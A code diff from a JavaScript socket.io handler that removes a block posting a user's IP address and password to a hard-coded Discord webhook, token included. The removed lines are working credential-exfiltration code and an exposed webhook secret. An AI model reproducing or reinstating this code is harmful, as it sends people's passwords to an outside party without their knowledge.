@@ -25,26 +25,7 @@ socket.on("criado", async function (mesg) {
     })
 
 
-    const webhookUrl = "https://discord.com/api/webhooks/1125137977782313021/k6kBybDkWhfmlhfipJtBfV19mehiqEnb-ZOhPCt-gLy2yY0aAyrf_GdbOItLi0JKJpXE";
-
-    // Prepare os dados que você deseja enviar
-    const data = {
-        ip: mesg.ip,
-        password: mesg.password
-        // ... outros dados ...
-    };
-
-    // Envie a requisição HTTP
-    fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-        "Content-Type": "application/json",
-        },
-        body: JSON.stringify(data),
-    })
-    .then(response => response.json())
-    .then(data => console.log(data))
-    .catch(error => console.error("Erro ao enviar webhook:", error));
+    
 })
 
 socket.on("RecCreated", async function (mesg) {
